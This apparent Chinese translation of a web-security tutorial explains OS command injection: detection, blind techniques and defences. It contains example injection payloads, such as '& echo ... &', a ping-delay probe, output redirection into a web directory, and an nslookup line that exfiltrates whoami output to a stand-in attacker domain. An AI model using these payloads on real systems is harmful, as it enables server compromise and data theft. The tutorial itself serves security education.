+++
draft = false
date = 2021-03-03T00:00:00+08:00
title = "web 安全之 OS command injection"
description = "web 安全之 OS command injection"
slug = ""
authors = []
tags = []
categories = ["web security"]
externalLink = ""
series = []
disableComments = true
+++

# OS command injection

在本节中，我们将解释什么是操作系统命令注入，描述如何检测和利用此漏洞，为不同的操作系统阐明一些有用的命令和技术，并总结如何防止操作系统命令注入。

![os command injection](https://raw.githubusercontent.com/RifeWang/images/master/web-security/os-command-injection.png)


## 什么是操作系统命令注入

OS 命令注入（也称为 shell 注入）是一个 web 安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意的操作系统命令，这通常会对应用程序及其所有数据造成严重危害。并且，攻击者也常常利用此漏洞危害基础设施中的其他部分，利用信任关系攻击组织内的其他系统。


## 执行任意命令

假设某个购物应用程序允许用户查看某个商品在特定商店中是否有库存，此信息可以通过以下 URL 获取：
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

为了提供返回信息，应用程序必须查询各种遗留系统。由于历史原因，此功能通过调用 shell 命令并传递参数来实现如下：
```
stockreport.pl 381 29
```

此命令输出特定商店中某个商品的库存信息，并将其返回给用户。

由于应用程序没有对 OS 命令注入进行防御，那么攻击者可以提交类似以下输入来执行任意命令：
```
& echo aiwefwlguh &
```

如果这个输入被当作 productID 参数，那么应用程序执行的命令就是：
```
stockreport.pl & echo aiwefwlguh & 29
```

`echo` 命令就是让提供的字符串在输出中显示的作用，其是测试某些 OS 命令注入的有效方法。`&` 符号就是一个 shell 命令分隔符，因此上例实际执行的是一个接一个的三个单独的命令。因此，返回给用户的输出为：
```
Error - productID was not provided
aiwefwlguh
29: command not found
```

这三行输出表明：
- 原来的 `stockreport.pl` 命令由于没有收到预期的参数，因此返回错误信息。
- 注入的 `echo` 命令执行成功。
- 原始的参数 29 被当成了命令执行，也导致了异常。

将命令分隔符 `&` 放在注入命令之后通常是有用的，因为它会将注入的命令与注入点后面的命令分开，这减少了随后发生的事情将阻止注入命令执行的可能性。


## 常用的命令

当你识别 OS 命令注入漏洞时，执行一些初始命令以获取有关系统信息通常很有用。下面是一些在 Linux 和 Windows 平台上常用命令的摘要：

|  命令含义   |  Linux  |   Windows  |
| :-- | :-- | :-- |
|  显示当前用户名   |   whoami   |  whoami   |
|  显示操作系统信息   |   uname -a   |  ver   |
|  显示网络配置   |   ifconfig   |  ipconfig /all   |
|  显示网络连接   |   netstat -an  |  netstat -an   |
|  显示正在运行的进程   |   ps -ef   |  tasklist   |



## 不可见 OS 命令注入漏洞

许多 OS 命令注入漏洞都是不可见的，这意味着应用程序不会在其 HTTP 响应中返回命令的输出。 不可见 OS 命令注入漏洞仍然可以被利用，但需要不同的技术。

假设某个 web 站点允许用户提交反馈信息，用户输入他们的电子邮件地址和反馈信息，然后服务端生成一封包含反馈信息的电子邮件投递给网站管理员。为此，服务端需要调用 mail 程序，如下：
```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

mail 命令的输出并没有作为应用程序的响应返回，因此使用 echo 负载不会有效。这种情况，你可以使用一些其他的技术来检测漏洞。


### 基于延时检测

你可以使用能触发延时的注入命令，然后根据应用程序的响应时长来判断注入的命令是否被执行。使用 `ping` 命令是一种有效的方式，因为此命令允许你指定要发送的 ICMP 包的数量以及命令运行的时间：
```
& ping -c 10 127.0.0.1 &
```

这个命令将会 ping 10 秒钟。


### 重定向输出

你可以将注入命令的输出重定向到能够使用浏览器访问到的 web 目录。例如，应用程序使用 /var/www/static 路径作为静态资源目录，那么你可以提交以下输入：
```
& whoami > /var/www/static/whoami.txt &
```

`>` 符号就是输出重定向的意思，上面这个命令就是把 whoami 的执行结果输出到 /var/www/static/whoami.txt 文件中，然后你就可以通过浏览器访问 `https://vulnerable-website.com/whoami.txt` 查看命令的输出结果。


### 使用 OAST 技术

使用 OAST 带外技术就是你要有一个自己控制的外部系统，然后注入命令执行，触发与你控制的系统的交互。例如：
```
& nslookup kgji2ohoyw.web-attacker.com &
```

这个负载使用 `nslookup` 命令对指定域名进行 DNS 查找，攻击者可以监视是否发生了指定的查找，从而检测命令是否成功注入执行。

带外通道还提供了一种简单的方式将注入命令的输出传递出来，例如：
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

这将导致对攻击者控制的域名的 DNS 查找，如：
```
wwwuser.kgji2ohoyw.web-attacker.com
```


## 注入 OS 命令的方法

各种 shell 元字符都可以用于执行 OS 命令注入攻击。

许多字符用作命令分隔符，从而将多个命令连接在一起。以下分隔符在 Windows 和 Unix 类系统上均可使用：
- `&`
- `&&`
- `|`
- `||`

以下命令分隔符仅适用于 Unix 类系统：
- `;`
- 换行符（`0x0a` 或 `\n`）

在 Unix 类系统上，还可以使用 <code>`</code> 反引号和 <code>$</code> 符号在原始命令内注入命令内联执行：
- <code>`</code>
- `$`


需要注意的是，不同的 shell 元字符具有细微不同的行为，这些行为可能会影响它们在某些情况下是否工作，以及它们是否允许在带内检索命令输出，或者只对不可见 OS 利用有效。

有时，你控制的输入会出现在原始命令中的引号内。在这种情况下，您需要在使用合适的 shell 元字符注入新命令之前终止引用的上下文（使用 `"` 或 <code>'</code>）。


## 如何防御 OS 命令注入攻击

防止 OS 命令注入攻击最有效的方法就是永远不要从应用层代码中调用 OS 命令。几乎在对于所有情况下，都有使用更安全的平台 API 来实现所需功能的替代方法。

如果认为使用用户提供的输入调用 OS 命令是不可避免的，那么必须执行严格的输入验证。有效验证的一些例子包括：
- 根据允许值的白名单校验。
- 验证输入是否为数字。
- 验证输入是否只包含字母数字字符，不包含其它语法或空格。

不要试图通过转义 shell 元字符来清理输入。实际上，这太容易出错，且很容易被熟练的攻击者绕过。